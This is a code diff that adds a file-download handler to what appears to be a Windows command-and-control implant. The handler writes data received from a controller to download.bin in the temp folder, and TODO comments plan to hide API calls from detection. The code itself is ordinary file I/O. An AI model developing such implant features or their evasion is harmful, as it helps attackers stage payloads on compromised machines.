@@ -347,13 +347,85 @@ void Controller::handleUpload(const InternalMessage& msg)
     messageHandler_->sendMessage(response);
 }
 
+
+// TODO: need to resolve all api calls used in this function
+// TODO: we shouldn't be opening/creating files with fopen... use virtualalloc/write, etc functions
 void Controller::handleDownload(const InternalMessage& msg)
 {
+    bool success = false;
+
+    char tempPath[MAX_PATH];
+    DWORD pathLength = GetTempPathA(MAX_PATH, tempPath);
+
+    if (pathLength > 0 && pathLength < MAX_PATH)
+    {
+        std::string filename = "download.bin";
+        std::string fullPath = std::string(tempPath) + filename;
+
+        HANDLE file = CreateFileA(
+            fullPath.c_str(),
+            GENERIC_WRITE,
+            0,
+            nullptr,
+            CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
+            nullptr
+        );
+
+        if (file != INVALID_HANDLE_VALUE)
+        {
+            size_t totalWritten = 0;
+            const auto& data = msg.data_;
+
+            success = true;
+
+            while (totalWritten < data.size())
+            {
+                DWORD bytesWritten = 0;
+
+                DWORD remaining = static_cast<DWORD>(
+                    (std::min)(data.size() - totalWritten,
+                        static_cast<size_t>(MAXDWORD))
+                    );
+
+                if (!WriteFile(
+                    file,
+                    data.data() + totalWritten,
+                    remaining,
+                    &bytesWritten,
+                    nullptr
+                ) || bytesWritten == 0)
+                {
+                    success = false;
+                    break;
+                }
+
+                totalWritten += bytesWritten;
+            }
+
+            CloseHandle(file);
+        }
+    }
+
+    // Send acknowledgment
     InternalMessage response;
-    response.header_.messageType_ = MessageType::ERROR_REPORT;
+
     response.header_.messageId_ = msg.header_.messageId_;
-    response.data_ = string2byte("DOWNLOAD_FILE is not implemented; no file transfer was performed.");
-    response.header_.dataSize_ = static_cast<uint32_t>(response.data_.size());
+
+    if (success)
+    {
+        response.header_.messageType_ = MessageType::COMMAND_RESULT;
+        response.data_ = string2byte("File downloaded successfully.");
+    }
+    else
+    {
+        response.header_.messageType_ = MessageType::ERROR_REPORT;
+        response.data_ = string2byte("Failed to save downloaded file.");
+    }
+
+    response.header_.dataSize_ =
+        static_cast<uint32_t>(response.data_.size());
+
     messageHandler_->sendMessage(response);
 }
 
